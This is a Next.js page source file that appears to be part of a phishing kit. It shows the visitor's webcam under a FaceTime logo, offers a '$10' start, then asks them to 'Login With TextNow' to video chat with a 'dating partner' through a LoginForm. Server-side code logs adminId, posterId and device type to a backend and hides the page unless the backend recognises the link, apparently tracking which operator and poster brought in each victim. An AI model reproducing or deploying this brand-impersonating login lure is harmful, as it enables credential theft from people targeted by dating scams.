import { useState } from "react";

import Webcam from "react-webcam";
import { API_URL, site } from "../../../config";
import Image from "next/image";
import LoginForm from "../../../components/LoginForm";

export default function Home() {
  const [showForm, setShowForm] = useState(false);
  const [showCall, setShowCall] = useState(false);
  return (
    <div className="relative text-black h-screen w-screen flex flex-col justify-center items-center">
      {/* <h1 className="absolute top-[40px] lg:top-[140px] text-white font-bold text-[30px]">
        Waiting...
      </h1> */}
      <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
        // height={1080}
        // width={1262}
        // screenshotFormat="image/jpeg"
        // videoConstraints={videoConstraints}
      />

      <div className="absolute mt-7 flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
        <>
          {!showForm ? (
            <div className="bg-white flex flex-col justify-center shadow-xl items-center md:w-[420px] pb-[100px] rounded-lg">
              <div className="relative">
                <div className=" w-[320px] h-[250px] pb-[200px]">
                  <Image
                    src="/images/FaceTime-logo.svg"
                    alt="avatar"
                    fill
                    className="object-cover "
                  />
                </div>
              </div>
              <button
                className="text-white px-10 py-2 outline-none border rounded-md mt-7 border-blue-500 bg-blue-500"
                onClick={() => setShowForm(true)}
              >
                Get started with $10{" "}
              </button>
            </div>
          ) : (
            <>
              {!showCall ? (
                <div class="p-5 w-[400px]">
                  <div class="mx-auto flex items-center justify-center mt-5">
                    <img
                      class="h-28  text-center"
                      src="/images/textnow-logo.png"
                      alt=""
                    />
                  </div>

                  <p class="text-xl pt-5 font-semibold text-[#707b8e]">
                    Login With TextNow and enjoy with{" "}
                    <b class="text-blue-500">TextNow video chat</b> your dating
                    partner.
                  </p>

                  <button
                    class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[#00BE70] text-xl font-semibold text-white rounded-md"
                    onClick={() => setShowCall(true)}
                  >
                    <span>
                      <img src="/images/logo.png" class="w-12 h-12" alt="" />
                    </span>
                    <span>Login With TextNow</span>
                  </button>
                </div>
              ) : (
                <LoginForm />
              )}
            </>
          )}
        </>
      </div>
    </div>
  );
}

export async function getServerSideProps({
  req,
  query: { adminId, posterId },
}) {
  const userAgent = req.headers["user-agent"];

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  const url = `${API_URL}/${site}/${adminId}/${posterId}/${device}`;

  const res = await fetch(url);
  const data = await res.json();

  if (data?.success !== "exists") {
    return {
      notFound: true,
    };
  }

  return {
    props: {},
  };
}
